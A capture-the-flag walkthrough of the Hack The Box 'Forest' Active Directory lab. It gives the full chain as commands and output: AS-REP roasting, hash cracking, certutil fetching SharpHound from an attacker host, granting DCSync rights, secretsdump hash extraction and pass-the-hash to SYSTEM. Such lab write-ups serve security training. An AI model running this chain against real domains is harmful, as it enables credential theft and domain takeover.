##### Host entries
```bash
10.10.10.161 FOREST.htb.local htb.local
```
If Active Directory => [[Synchronize NTP]] with the domain controller.

### Content

- RPC Enumeration
- ASREPRoast attack [X] Kerbrute enumeration [✓] impacket-getNPUsers
- SharpHound.exe
- BloodHound privilege escalation
- DCSync Attack through WriteDacl permission
- Creation of a User and addition to special group

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvv -oG allPorts 10.10.10.161
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.161 ()   Status: Up
Host: 10.10.10.161 ()   Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49671/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49684/open/tcp/////, 49706/open/tcp/////
```
Services and Versions running:
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706 -sCV -Pn -n -vvv -oN targeted 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up, received user-set (0.14s latency).
Scanned at 2023-02-04 02:50:40 GMT for 70s

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-02-04 02:50:47Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-02-03T18:51:43-08:00
| smb2-time: 
|   date: 2023-02-04T02:51:45
|_  start_date: 2023-02-04T02:38:17
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20974/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62981/udp): CLEAN (Timeout)
|   Check 4 (port 44587/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h40m05s, deviation: 4h37m09s, median: 4s
```
Nmap with bootstrap:
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706 -sCV -Pn -n -vvv 10.10.10.161 -oX targetedbootstrap --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl
```
To give an order to the enumeration, we'll start with port [[KERBEROS (tcp-88)]], we can try to use some of the most common dictionaries for Kerberos but no results:
```bash
kerbrute userenum -d htb.local --dc 10.10.10.161 /usr/share/seclists/Kerberos/A-ZSurnames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/04/23 - Ronnie Flathers @ropnop

2023/02/04 02:51:23 >  Using KDC(s):
2023/02/04 02:51:23 >   10.10.10.161:88

2023/02/04 02:53:29 >  Done! Tested 13000 usernames (0 valid) in 125.121 seconds
```
Let's keep enumerating the next port which is [[RPC (tcp-135)]] by login unauthenticatedly we can extract all the users from the domain:
```bash
rpcclient -U "" 10.10.10.161 -N
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
### Exploitation
If we generate a list with all this users, we can try to abuse the [[ASREPRoast Attack]] with kerbrute:
```bash
kerbrute userenum -d htb.local --dc 10.10.10.161 users                                        

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/04/23 - Ronnie Flathers @ropnop

2023/02/04 03:00:59 >  Using KDC(s):
2023/02/04 03:00:59 >   10.10.10.161:88

2023/02/04 03:00:59 >  [+] VALID USERNAME:       Administrator@htb.local
2023/02/04 03:00:59 >  [+] VALID USERNAME:       HealthMailboxc3d7722@htb.local
2023/02/04 03:00:59 >  [+] VALID USERNAME:       HealthMailbox968e74d@htb.local
2023/02/04 03:00:59 >  [+] VALID USERNAME:       HealthMailbox670628e@htb.local
2023/02/04 03:00:59 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@htb.local
2023/02/04 03:00:59 >  [+] VALID USERNAME:       HealthMailboxfc9daad@htb.local
2023/02/04 03:00:59 >  [+] VALID USERNAME:       HealthMailbox6ded678@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       HealthMailboxfd87238@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       HealthMailbox83d6781@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       HealthMailboxb01ac64@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       HealthMailbox7108a4e@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       sebastien@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       HealthMailbox0659cc1@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       lucinda@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       andy@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       mark@htb.local
2023/02/04 03:01:00 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:b4f67e42e06a833b7f1edce66c8f0212$e65ed5978468a85f7863d7f8df623ec6c1f6327758790a51580df4f11dd659897847420304a9630f238227553604546855fb103cca817179fd6fa94f935dbbbd5ddfd3ffa2e144b19b34f80a4673ab97e3cec7a2a78d108aa28dd502eba56bbae87ca582ad00a4695e807cdd47da731acc394a8c30d5c979fa22c5238b4d93b65bc5ed515be6e15b3fa9be02e6f9c1708e1b5f8238816c659177ae5fee35b4a77445304cd713ff3e3500f58a49aee97c89b425fecfb1e5fbad94be6375ec87f4ba56228f8a3bc0bc728cb3e0e46d016428db5e3b23f1493ea8456bdd122ca17743f2f59d8ea0ccc5d5ffd8f6fed2805aa0f366f1dbed0b8c3380                                                                                                                                                                              
2023/02/04 03:01:00 >  [+] VALID USERNAME:       svc-alfresco@htb.local
2023/02/04 03:01:00 >  [+] VALID USERNAME:       santi@htb.local
```
The result throws a krb5asrep ticket which we can try to crack with [[Hashcat]] and try to get the cleartext password:
```cmd
hashcat.exe -m 18200 -a 0 hash.txt rockyou.txt
```
Unfortunately, it seems like the password is not part of rockyou dictionary, let's keep enumerating.
After several research we identify that there is another way to perform an [[ASREPRoast Attack]] which involves impacket utility:
```bash
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users -format hashcat -outputfile hashes.txt
```
That way the hash is different, because we can actually set the format which is the needed for hashcat and then we can proceed to crack it:
```bash
cat hashes.txt          
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0869d960b1cab4d0abbd86a4e09ba94b$a8f23fbc68a883010d7465c05b688a6ebc82b166515f46defc4cc65d97bb11ac3a19966439de719ef4e5409e3cb96544e37e14e3cbfb2d62484eb24de0afe4ef9e97f274b80f61456d6709f58d97f69e56f49c0fea273e4364efc8ae0d523fcab10b897e485bcc1e743737880bcd2d03030ebfb7caecfc626250f3a1380a542a5cb9e3c4262fdce0941fd3a42da5aefdcbcab689c01cd3da8172dc55114187a520bd5612832fb6e0ecb7b8a2d1cea96e53c23a24d9dc16448b141047de05b7b65480a5b5f0f4ef486801c6c27cf4fcf33301c2ffd25fb2602d0fd39d53d836fd6ba445c3dc51
```
[[Hashcat]] output:
```bash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0869d960b1cab4d0abbd86a4e09ba94b$a8f23fbc68a883010d7465c05b688a6ebc82b166515f46defc4cc65d97bb111ac3a19966439de719ef4e5409e3cb96544e37e14e3cbfb2d62484eb24de0afe4ef9e97f274b80f61456d6709f58d97f69e56f49c0fea273e4364efc8ae0d523fcab110b897e485bcc1e743737880bcd2d03030ebfb7caecfc626250f3a1380a542a5cb9e3c4262fdce0941fd3a42da5aefdcbcab689c01cd3da8172dc55114187a520bd56612832fb6e0ecb7b8a2d1cea96e53c23a24d9dc16448b141047de05b7b65480a5b5f0f4ef486801c6c27cf4fcf33301c2ffd25fb2602d0fd39d53d836fd6ba445c3dcc51:s3rvice
```
Then with this credentials, we are able to access to the system using [[Evil-winrm]] since port  tcp-5985 is open:  ^b22389
```powershell
evil-winrm -i 10.10.10.161 -u 'htb.local\svc-alfresco' -p 's3rvice'
```
### Privilege Escalation
Lets simply enumerate privileges from users, groups and network:
```powershell
# users
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
DefaultAccount           Guest                    HealthMailbox0659cc1
HealthMailbox670628e     HealthMailbox6ded678     HealthMailbox7108a4e
HealthMailbox83d6781     HealthMailbox968e74d     HealthMailboxb01ac64
HealthMailboxc0a90c9     HealthMailboxc3d7722     HealthMailboxfc9daad
HealthMailboxfd87238     krbtgt                   lucinda
mark                     santi                    sebastien
shuciran                 SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco
The command completed with one or more errors.
# Groups
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net groups

Group Accounts for \\

-------------------------------------------------------------------------------
*$D31000-NSEL5BRJ63V7
*Cloneable Domain Controllers
*Compliance Management
*Delegated Setup
*Discovery Management
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Exchange Servers
*Exchange Trusted Subsystem
*Exchange Windows Permissions
*ExchangeLegacyInterop
*Group Policy Creator Owners
*Help Desk
*Hygiene Management
*Key Admins
*Managed Availability Servers
*Organization Management
*Privileged IT Accounts
*Protected Users
*Public Folder Management
*Read-only Domain Controllers
*Recipient Management
*Records Management
*Schema Admins
*Security Administrator
*Security Reader
*Server Management
*Service Accounts
*test
*UM Management
*View-Only Organization Management
The command completed with one or more errors.
# Network
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : FOREST
   Primary Dns Suffix  . . . . . . . : htb.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb.local

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-BA-E1
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.161(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{E00B7E21-EE8E-4210-8C23-A108EFC92167}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```
So far nothing interesting, so let's try to enumerate with SharpHound.exe by uploading it to the machine: ^8fde0e
```powershell
certutil.exe -urlcache -f http://10.10.14.3/SharpHound.exe SharpHound.exe
```
Then we execute it and we get a .zip which will be ingested by Bloodhound itself:
```powershell
Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/3/2023   8:54 PM          18811 20230203205407_BloodHound.zip
-a----         2/3/2023   8:54 PM          19538 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
```
After start [[Bloodhound]] and uploads the files we get the following diagram.
Explanation:
1) User svc-alfresco is part of the "Service Accounts" group, which is group of the "Privileged IT Accounts" group which is part of the group "Account Operators" which is also part of the group "Exchange Windows Permissions".
2) The group "Exchange Windows Permissions" has the privilege "WriteDacl".
![[Pasted image 20230203233825.png]]
3) This permission "WriteDacl" can be abused as per the following description:
![[Pasted image 20230203234731.png]]
4)  Meaning that if we somehow can add a user into that group we'll be able to abuse of such feature.

So let's try to create a user first: ^80fd2e
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user shuciran shucir4n /add
```
Then as per the description in the diagram we need to add this user into the "Exchange Windows Permissions" group:
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" shuciran /add

The command completed successfully.
```
Finally, let's check if the user has been created:
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user shuciran
User name                    shuciran
...
Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
```
Meaning that this user has been created and is part of such group.
Now by reading the description of the Bloodhound we find that we need to run some commands to add give the user this DCSync Privilege:
![[Pasted image 20230204000117.png]]
```powershell
$SecPassword = ConvertTo-SecureString 'shucir4n' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('htb.local\shuciran', $SecPassword)
```
Finally we follow the last instruction from Bloodhound:
![[Pasted image 20230204000242.png]]
#DC-Note Take care with the Parameter "-TargetIdentity" used by Bloodhound is better to use the following syntaxis as well as the "-PrincipalIdentity" parameter:
```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity shuciran -Rights DCSync
```
Then all we need to do is extract the hashes with secretsdump.py:
```bash
secretsdump.py htb.local/shuciran@10.10.10.161
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
Finally we can do a [[Pass The Hash]] attack with impacket-psexec:
```bash
impacket-psexec htb.local/Administrator:@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
...
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
And we are NT Authority\\System
### Credentials
```bash
svc-alfresco:s3rvice
administrator: Hash-> aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

### Notes

- Sometimes is better to use the impacket utility and sometimes use other options, such as in this case, kerbrute didn't retrieve the hash correctly, but using impacket-GetNPUsers we were able to choose the format output of the hash to crack it with hashcat.
- Similar to the previous scenario, to do a DCSync Attack we can use impacket-secretsdump, but in this case that utility didn't work, so our other option was secretsdump.py

### References

None

